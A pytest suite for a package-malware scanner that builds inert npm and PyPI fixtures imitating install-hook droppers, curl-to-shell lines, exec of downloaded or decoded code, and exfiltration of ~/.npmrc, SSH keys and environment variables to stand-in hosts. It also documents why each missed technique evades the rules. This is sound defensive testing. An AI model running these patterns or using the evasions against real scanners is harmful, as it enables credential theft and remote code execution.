"""Synthetic evasion suite: 17 inert packages imitating real techniques.

3 are detected and 14 pass as clean scans (status ok, no findings, exit 0).
Each miss is pinned as a strict expected failure naming the rule that should
see it and why it does not. The day a rule closes one, the xfail turns into an
unexpected pass and the suite goes red, so the published count has to change
with it. A second, plain test pins every miss as a clean scan, so a miss closed
by a different rule than the one named here also turns the suite red.

Inertness: every host is under ``.invalid`` (RFC 6761, never resolves), the
decoded payload is ``print('hi')`` / ``console.log('hi')``, credential paths
appear only as string literals, and nothing is ever executed. The one real host
is the Discord webhook prefix in two cases: the secret-exfil rule is tied to
the real host name (a control below shows ``.invalid`` does not fire). The
webhook id 0 does not exist and no fixture makes a call.

As in the other rule tests, every suspicious-looking source is assembled from
tokens at test runtime, so no committed file contains the literal pattern
(``test_esl003.test_repo_files_do_not_trip_the_rules`` checks that).
"""

from __future__ import annotations

import base64
import json
from dataclasses import dataclass
from pathlib import Path

import pytest
from builders import TarItem, ZipItem, make_tar, make_zip

from eslabon import scan
from eslabon.model import Limits, PackageRef, ScanResult

VER = "0.0.1"
HTTPS = "https" + "://"
PY_HI = base64.b64encode(b"print('hi')").decode("ascii")
JS_HI = base64.b64encode(b"console.log('hi')").decode("ascii")
EX = "ex" + "ec"
EV = "ev" + "al"
B64D = "b64" + "decode"
URLOPEN = "url" + "open"
URLRETRIEVE = "url" + "retrieve"
URLLIB_REQ = "urllib" + ".request"
OS_SYSTEM = "os." + "system"
# A download piped into a shell.
FETCH_PIPE = "cu" + "rl -fsSL " + HTTPS + "pkg.invalid/i.sh | s" + "h"
NPMRC = ".np" + "mrc"
# Real host on purpose (see the module docstring): id 0, never called.
WEBHOOK = HTTPS + "disc" + "ord.com/api/web" + "hooks/0/eslabon-fixture"
ENV_DUMP = "JSON." + "stringify(process." + "env)"


def _lines(*lines: str) -> bytes:
    return ("\n".join(lines) + "\n").encode("utf-8")


# ------------------------------------------------------------ packages ----


def _npm(name: str, pkg: dict, files: dict[str, bytes]) -> tuple[str, bytes]:
    doc = {"name": name, "version": VER, "license": "MIT", **pkg}
    items = [
        TarItem("package/package.json", (json.dumps(doc, indent=2) + "\n").encode())
    ]
    items += [TarItem(f"package/{k}", v) for k, v in files.items()]
    return f"{name}-{VER}.tgz", make_tar(items)


def _setup_py(name: str, *body: str) -> bytes:
    return _lines(
        *body,
        "from setuptools import setup",
        f"setup(name='{name}', version='{VER}')",
    )


def _sdist(name: str, files: dict[str, bytes]) -> tuple[str, bytes]:
    top = f"{name}-{VER}"
    pkg_info = f"Metadata-Version: 2.1\nName: {name}\nVersion: {VER}\n\n".encode()
    items = [TarItem(f"{top}/PKG-INFO", pkg_info)]
    items += [TarItem(f"{top}/{k}", v) for k, v in files.items()]
    return f"{top}.tar.gz", make_tar(items)


def _wheel(name: str, files: dict[str, bytes]) -> tuple[str, bytes]:
    di = f"{name}-{VER}.dist-info"
    items = [ZipItem(k, v) for k, v in files.items()]
    items += [
        ZipItem(
            f"{di}/METADATA",
            f"Metadata-Version: 2.1\nName: {name}\nVersion: {VER}\n\n".encode(),
        ),
        ZipItem(
            f"{di}/WHEEL",
            b"Wheel-Version: 1.0\nGenerator: eslabon-fixture\n"
            b"Root-Is-Purelib: true\nTag: py3-none-any\n",
        ),
        ZipItem(f"{di}/RECORD", b""),
    ]
    return f"{name}-{VER}-py3-none-any.whl", make_zip(items)


def _npm_case(n: str, pkg: dict, files: dict[str, bytes] | None = None):
    return "npm", _npm(f"eslabon-fixture-{n}", pkg, files or {})


def _sdist_case(n: str, files: dict[str, bytes]):
    return "pypi", _sdist(f"eslabon_fixture_{n}", files)


def _wheel_case(n: str, files: dict[str, bytes]):
    return "pypi", _wheel(f"eslabon_fixture_{n}", files)


def _setup_case(n: str, *body: str):
    name = f"eslabon_fixture_{n}"
    return "pypi", _sdist(name, {"setup.py": _setup_py(name, *body)})


@dataclass(frozen=True)
class Case:
    id: str
    technique: str
    rule: str  # the rule that sees it, or should
    why: str  # why it does not, for a miss; "" for a detected case
    build: object  # () -> (ecosystem, (file name, archive bytes))


DETECTED = [
    Case(
        "01",
        "postinstall pipes a download into a shell",
        "ESL-002",
        "",
        lambda: _npm_case("01", {"scripts": {"postinstall": FETCH_PIPE}}),
    ),
    Case(
        "02",
        "setup.py downloads a payload and runs it base64-decoded"
        " (classic PyPI dropper)",
        "ESL-001+ESL-003",
        "",
        lambda: _setup_case(
            "02",
            "import base64",
            f"from {URLLIB_REQ} import {URLOPEN}",
            f"data = {URLOPEN}('{HTTPS}pkg.invalid/stage2').read()",
            f"{EX}(base64.{B64D}(data or b'{PY_HI}'))",
        ),
    ),
    Case(
        "03",
        "a file names ~/.npmrc and a Discord webhook",
        "ESL-004",
        "",
        lambda: _npm_case(
            "03",
            {"main": "index.js"},
            {
                "index.js": _lines(
                    "const os = require('os'); const path = require('path');",
                    f"const source = path.join(os.homedir(), '{NPMRC}');",
                    f"const sink = '{WEBHOOK}';",
                    "console.log('hi');",
                )
            },
        ),
    ),
]

MISSES = [
    Case(
        "04",
        "preinstall runs a JS file that sends env to an API (Shai-Hulud 2.0 style)",
        "ESL-002",
        "it judges the lifecycle script string, not the .js file the script runs; "
        "the secret-exfil rule has no sink for an ordinary API host",
        lambda: _npm_case(
            "04",
            {"scripts": {"preinstall": "node setup_bun.js"}},
            {
                "setup_bun.js": _lines(
                    f"const body = {ENV_DUMP};",
                    f"const url = '{HTTPS}api.github.invalid/user/repos';",
                    "console.log('hi');",
                )
            },
        ),
    ),
    Case(
        "05",
        "dependency fetched from a plain http:// URL (PhantomRaven style)",
        "ESL-002",
        "only lifecycle scripts are parsed; no rule reads dependencies",
        lambda: _npm_case(
            "05",
            {
                "dependencies": {
                    "eslabon-dep": "http" + "://packages.invalid/eslabon-dep-1.0.0.tgz"
                }
            },
        ),
    ),
    Case(
        "06",
        "JS eval reached through a computed property name",
        "ESL-003",
        "it needs the literal evaluator call",
        lambda: _npm_case(
            "06",
            {"main": "index.js"},
            {
                "index.js": _lines(
                    "const g = globalThis;",
                    f"g['{EV[:2]}' + '{EV[2:]}']"
                    f"(Buffer.from('{JS_HI}', 'base64').toString());",
                )
            },
        ),
    ),
    Case(
        "07",
        "JS base64 decoded on one line, evaluated on the next",
        "ESL-003",
        "decoder and evaluator must sit on the same line",
        lambda: _npm_case(
            "07",
            {"main": "index.js"},
            {
                "index.js": _lines(
                    f"const d = Buffer.from('{JS_HI}', 'base64').toString();",
                    f"{EV}(d);",
                )
            },
        ),
    ),
    Case(
        "08",
        "postinstall runs a shell script that pipes a download into a shell",
        "ESL-002",
        "it judges the script string in package.json, never the file it runs",
        lambda: _npm_case(
            "08",
            {"scripts": {"postinstall": "sh setup.sh"}},
            {"setup.sh": _lines("#!/bin/sh", FETCH_PIPE)},
        ),
    ),
    Case(
        "09",
        "binding.gyp command expansion that pipes a download into a shell",
        "ESL-002",
        "nothing reads binding.gyp or emulates the install node-gyp runs implicitly",
        lambda: _npm_case(
            "09",
            {},
            {
                "binding.gyp": json.dumps(
                    {
                        "targets": [
                            {
                                "target_name": "addon",
                                "sources": ["<!(" + FETCH_PIPE + ")"],
                            }
                        ]
                    },
                    indent=2,
                ).encode()
            },
        ),
    ),
    Case(
        "10",
        "download command kept in a variable, then passed to os.system",
        "ESL-001",
        "the download tool or URL must sit inside the call's parentheses",
        lambda: _setup_case(
            "10", "import os", f'CMD = "{FETCH_PIPE}"', f"{OS_SYSTEM}(CMD)"
        ),
    ),
    Case(
        "11",
        "wheel that downloads a binary when imported",
        "ESL-001",
        "it applies only to the setup.py of an sdist",
        lambda: _wheel_case(
            "11",
            {
                "eslabon_fixture_11/__init__.py": _lines(
                    "import os, tempfile, " + URLLIB_REQ,
                    "_p = os.path.join(tempfile.gettempdir(), 'fixture_11.exe')",
                    f"{URLLIB_REQ}.{URLRETRIEVE}('{HTTPS}pkg.invalid/payload.exe', _p)",
                    "print('hi')",
                )
            },
        ),
    ),
    Case(
        "12",
        "wheel .pth startup file that fetches code and runs it",
        "ESL-001",
        "no network rule applies outside setup.py, and without a decoder on the "
        "line the encoded-exec rule does not fire",
        lambda: _wheel_case(
            "12",
            {
                "eslabon_fixture_12/__init__.py": b"",
                "eslabon_fixture_12.pth": _lines(
                    f"import {URLLIB_REQ}; {EX}({URLLIB_REQ}.{URLOPEN}"
                    f"('{HTTPS}pkg.invalid/p').read() or \"print('hi')\")"
                ),
            },
        ),
    ),
    Case(
        "13",
        "Python base64 decoded into a variable, executed on the next line",
        "ESL-003",
        "decoder and evaluator must sit on the same line",
        lambda: _setup_case(
            "13", "import base64", f"c = base64.{B64D}('{PY_HI}')", f"{EX}(c)"
        ),
    ),
    Case(
        "14",
        "~/.npmrc sent to an ordinary domain",
        "ESL-004",
        "sinks are a closed list of webhook, paste, tunnel and OAST hosts",
        lambda: _npm_case(
            "14",
            {"main": "index.js"},
            {
                "index.js": _lines(
                    "const os = require('os'); const path = require('path');",
                    f"const source = path.join(os.homedir(), '{NPMRC}');",
                    f"const sink = '{HTTPS}collector.eslabon-fixture.invalid/upload';",
                    "console.log('hi');",
                )
            },
        ),
    ),
    Case(
        "15",
        "SSH key path built by string concatenation, sent to a Discord webhook",
        "ESL-004",
        "the credential source needs the literal .ssh path segment",
        lambda: _npm_case(
            "15",
            {"main": "index.js"},
            {
                "index.js": _lines(
                    "const os = require('os'); const path = require('path');",
                    "const source = path.join(os.homedir(), '.ss' + 'h', 'id_"
                    + "rsa');",
                    f"const sink = '{WEBHOOK}';",
                    "console.log('hi');",
                )
            },
        ),
    ),
    Case(
        "16",
        "in-tree PEP 517 build backend that pipes a download into a shell",
        "ESL-001",
        "it is scoped by file name to setup.py",
        lambda: _sdist_case(
            "16",
            {
                "pyproject.toml": _lines(
                    "[build-system]",
                    "requires = []",
                    'build-backend = "backend"',
                    'backend-path = ["_build"]',
                ),
                "_build/backend.py": _lines(
                    "import os",
                    "def build_wheel(wheel_directory, config_settings=None,"
                    " metadata_directory=None):",
                    f'    {OS_SYSTEM}("{FETCH_PIPE}")',
                    "    print('hi')",
                ),
            },
        ),
    ),
    Case(
        "17",
        "Python exec reached through getattr(builtins, 'exec')",
        "ESL-003",
        "it needs the literal evaluator call",
        lambda: _setup_case(
            "17",
            "import base64, builtins",
            f"getattr(builtins, '{EX}')(base64.{B64D}('{PY_HI}'))",
        ),
    ),
]

# Controls: the same payload line moved to where the rule looks, which shows
# that cases 12 and 16 are misses of scope, not of pattern.
CONTROLS = [
    Case(
        "12-control",
        "wheel .pth startup file with the decoder on the evaluated line",
        "ESL-003",
        "",
        lambda: _wheel_case(
            "12c",
            {
                "eslabon_fixture_12c/__init__.py": b"",
                "eslabon_fixture_12c.pth": _lines(
                    f"import base64; {EX}(base64.{B64D}('{PY_HI}'))"
                ),
            },
        ),
    ),
    Case(
        "16-control",
        "the build backend's download line placed in setup.py",
        "ESL-001",
        "",
        lambda: _setup_case("16c", "import os", f'{OS_SYSTEM}("{FETCH_PIPE}")'),
    ),
]

TOTAL = len(DETECTED) + len(MISSES)


@pytest.fixture(scope="module")
def results(tmp_path_factory) -> dict[str, ScanResult]:
    """Scan every case once, in-process and offline (content rules only)."""
    out = {}
    root = tmp_path_factory.mktemp("known_misses")
    for case in DETECTED + MISSES + CONTROLS + [LEGIT_INSTALLER]:
        eco, (fname, data) = case.build()
        path = root / case.id / fname
        path.parent.mkdir()
        path.write_bytes(data)
        out[case.id] = scan.analyze_archive(
            path, PackageRef(None, None, eco, ""), Limits()
        )
    return out


def _rules(result: ScanResult) -> set[str]:
    return {f.rule_id for f in result.findings}


def _ids(cases: list[Case]) -> list[str]:
    return [f"{c.id} {c.technique}" for c in cases]


def test_suite_size():
    assert (len(DETECTED), len(MISSES), TOTAL) == (3, 14, 17)
    assert len({c.id for c in DETECTED + MISSES}) == TOTAL


@pytest.mark.parametrize("case", DETECTED, ids=_ids(DETECTED))
def test_detected(case, results):
    result = results[case.id]
    assert result.status == "ok"
    assert set(case.rule.split("+")) <= _rules(result)


@pytest.mark.parametrize(
    "case",
    [
        pytest.param(
            c, marks=pytest.mark.xfail(strict=True, reason=f"{c.rule}: {c.why}")
        )
        for c in MISSES
    ],
    ids=_ids(MISSES),
)
def test_miss_is_seen_by_its_rule(case, results):
    assert case.rule in _rules(results[case.id])


@pytest.mark.parametrize("case", MISSES, ids=_ids(MISSES))
def test_miss_scans_clean(case, results):
    # exit 0 with nothing flagged: not even an anomaly hints that content was skipped
    result = results[case.id]
    assert (result.status, result.findings) == ("ok", [])
    assert not [a for a in result.anomalies if a.kind in scan.INCOMPLETE_KINDS]


@pytest.mark.parametrize("case", CONTROLS, ids=_ids(CONTROLS))
def test_control_fires_where_the_rule_looks(case, results):
    assert case.rule in _rules(results[case.id])


# A legitimate installer (esbuild, puppeteer style) downloads and runs a binary
# from its postinstall. Closing case 04 or 08 must not make this fire.
LEGIT_INSTALLER = Case(
    "legit-installer",
    "postinstall runs install.js, which downloads the platform binary",
    "",
    "",
    lambda: _npm_case(
        "legit",
        {"scripts": {"postinstall": "node install.js"}},
        {
            "install.js": _lines(
                "const https = require('https');",
                "const fs = require('fs');",
                "const { execFileSync } = require('child_process');",
                f"const url = '{HTTPS}releases.invalid/v1.0.0/bin-linux-x64.tgz';",
                "https.get(url, (res) => res.pipe(fs.createWriteStream('bin.tgz')));",
                "execFileSync('tar', ['xzf', 'bin.tgz']);",
            )
        },
    ),
)


def test_legitimate_installer_stays_silent(results):
    assert results[LEGIT_INSTALLER.id].findings == []


def test_case_ids_are_unique():
    ids = [c.id for c in DETECTED + MISSES + CONTROLS + [LEGIT_INSTALLER]]
    assert len(ids) == len(set(ids))
    assert all(Path(i).name == i for i in ids)  # usable as a directory name
